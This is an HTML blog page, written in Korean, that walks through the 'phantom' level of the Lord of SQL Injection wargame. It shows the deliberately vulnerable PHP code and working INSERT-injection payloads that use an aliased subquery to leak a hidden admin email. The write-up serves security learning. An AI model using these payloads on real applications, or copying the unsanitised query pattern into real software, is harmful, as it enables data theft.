@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - phantom 문제풀이 | mingzzi</title>
+	<meta name="description" content="이번엔 유령이다 유령phantom 이라는 문제인데 Write-up은 The Phantom Of The Opera 들으면서 써야겠다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/09/16/los-phantom.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - phantom 문제풀이</h1>
+    
+    <p class="meta">
+      September 16, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>이번엔 유령이다 유령</p>
+
+<p><code class="highlighter-rouge">phantom</code> 이라는 문제인데 Write-up은 <code class="highlighter-rouge">The Phantom Of The Opera</code> 들으면서 써야겠다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">ip</th>
+      <th style="text-align: center">email</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">127.0.0.1</td>
+      <td style="text-align: center"><strong>**</strong><strong>**</strong>**</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">(</span><span class="s2">"phantom"</span><span class="p">);</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'joinmail'</span><span class="p">]){</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"insert into prob_phantom values(0,'</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]</span><span class="si">}</span><span class="s2">','</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">joinmail</span><span class="p">]</span><span class="si">}</span><span class="s2">')"</span><span class="p">;</span>
+    <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select no,ip,email from prob_phantom where no=1 or ip='</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$rows</span><span class="p">))){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'no'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"**************"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">ip</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">echo</span> <span class="s2">"&lt;/table&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select email from prob_phantom where no=1 and email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])){</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"delete from prob_phantom where no != 1"</span><span class="p">);</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"alter table prob_phantom AUTO_INCREMENT=2"</span><span class="p">);</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"phantom"</span><span class="p">);</span> <span class="p">}</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>보면 <code class="highlighter-rouge">joinmail</code>이라는 이름으로 가입 할(?) 이메일 주소를 입력 받는다.</p>
+
+<p>그리고 현재 데이터베이스에 저장되어 있는 값 중, <code class="highlighter-rouge">no=1</code>인 값과 내 IP 주소와 같은 주소로 저장되어 있는 행을 <code class="highlighter-rouge">select</code> 해 출력 해 준다.</p>
+
+<p>이 때, <code class="highlighter-rouge">no=1</code>인 행의 <code class="highlighter-rouge">email</code> 주소는 <code class="highlighter-rouge">**************</code>로 바뀌어 출력된다.</p>
+
+<p>문제를 풀기 위해서는 <code class="highlighter-rouge">no=1</code>인 행의 <code class="highlighter-rouge">email</code>의 주소를 정확하게 알아내면 된다.</p>
+
+<p><code class="highlighter-rouge">joinmail</code>에서 테스트를 해 보았더니, 넘어온 값에 대해 제대로 검증을 하지 않아 한번에 여러 행을 추가할 수 있다는 사실을 알아냈다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?joinmail=test1'), (2, 'MY IP', 'test2
+</code></pre></div></div>
+
+<p>이렇게 입력하면 완성되는 쿼리는 아래와 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert into prob_phantom values(0,'MY IP','test1'), (2, 'MY IP', 'test2')
+</code></pre></div></div>
+
+<p>그 결과 한번에 <code class="highlighter-rouge">test1</code>과 <code class="highlighter-rouge">test2</code>가 저장된 것을 확인할 수 있다.</p>
+
+<p>그래서 처음에는 <code class="highlighter-rouge">no=1</code>인 행을 덮어 쓰면 되지 않을까 생각했다.</p>
+
+<p>근데 <code class="highlighter-rouge">no</code> 자리에 <code class="highlighter-rouge">1</code>을 넣어서 시도 해 보면 아예 쿼리가 먹히지 않았다.</p>
+
+<p>아무래도 뭔가 설정 상으로 막아둔 것 같았다.</p>
+
+<p>그래서 그 다음 방법으로는 <code class="highlighter-rouge">insert</code>문에 <code class="highlighter-rouge">select</code>로 <code class="highlighter-rouge">subquery</code>를 넣어 <code class="highlighter-rouge">no=1</code>인 행의 <code class="highlighter-rouge">email</code>을 뽑아 새로운 행으로 저장하는 방법을 생각했다.</p>
+
+<p>처음에 문법을 제대로 몰라서 좀 삽질을 했다.</p>
+
+<p>내 서버에서 테스트를 좀 했었는데, <code class="highlighter-rouge">ERROR 1093 (HY000): You can't specify target table 'user' for update in FROM clause</code> 이런 오류가 계속 났다.</p>
+
+<p>알고보니 현재 테이블에서 값을 뽑아 현재 테이블의 값으로 저장하는 것은 안된다고 한다.</p>
+
+<p>예를 들어, 아래와 같은 <code class="highlighter-rouge">insert</code>문을 작성했다고 가정하자.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert into user value('id1', 'pw1'), ('id2', (select pw from user where id='admin'));
+</code></pre></div></div>
+
+<p>이 경우, <code class="highlighter-rouge">user</code>라는 테이블에 <code class="highlighter-rouge">user</code> 테이블에서 값을 추출 해 삽입하기 때문에 위와 같은 <code class="highlighter-rouge">1093</code>에러가 발생한다.</p>
+
+<p>이 때 간단한 해결 방법이 있는데, 바로 <code class="highlighter-rouge">select</code> 문에서 테이블 명에 별칭을 주는 것이다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert into user value('id1', 'pw1'), ('id2', (select pw from user tmp where id='admin'));
+</code></pre></div></div>
+
+<p>위와 같이 <code class="highlighter-rouge">select pw from user</code>를 <code class="highlighter-rouge">select pw from user tmp</code>로 바꾸면 에러가 발생하지 않는다.</p>
+
+<p>이를 바탕으로 쿼리문을 아래와 같이 구성했다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?joinmail=test'), (3, '210.126.104.194', (select email from prob_phantom tmp where no=1))#
+</code></pre></div></div>
+
+<p>그 결과 평문으로 된 <code class="highlighter-rouge">no=1</code>인 행의 <code class="highlighter-rouge">email</code> 주소를 얻을 수 있었다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">ip</th>
+      <th style="text-align: center">email</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">127.0.0.1</td>
+      <td style="text-align: center"><strong>**</strong><strong>**</strong>**</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">MY IP</td>
+      <td style="text-align: center">admin_secure_email@debu.kr</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">MY IP</td>
+      <td style="text-align: center">test</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>이제 이메일을 구했으니, <code class="highlighter-rouge">?email=admin_secure_email@debu.kr</code>을 쿼리스트링으로 넘기면 문제를 풀 수 있다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHANTOM Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">(</span><span class="s2">"phantom"</span><span class="p">);</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'joinmail'</span><span class="p">]){</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"insert into prob_phantom values(0,'</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]</span><span class="si">}</span><span class="s2">','</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">joinmail</span><span class="p">]</span><span class="si">}</span><span class="s2">')"</span><span class="p">;</span>
+    <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select no,ip,email from prob_phantom where no=1 or ip='</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$rows</span><span class="p">))){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'no'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"**************"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">ip</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">echo</span> <span class="s2">"&lt;/table&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select email from prob_phantom where no=1 and email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])){</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"delete from prob_phantom where no != 1"</span><span class="p">);</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"alter table prob_phantom AUTO_INCREMENT=2"</span><span class="p">);</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"phantom"</span><span class="p">);</span> <span class="p">}</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">PHANTOM Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/09/16/los-phantom.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/14/los-frankenstein.html">
+        [Lord of SQL Injection] LoS - frankenstein 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/17/los-ouroboros.html">
+        [Lord of SQL Injection] LoS - ouroboros 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
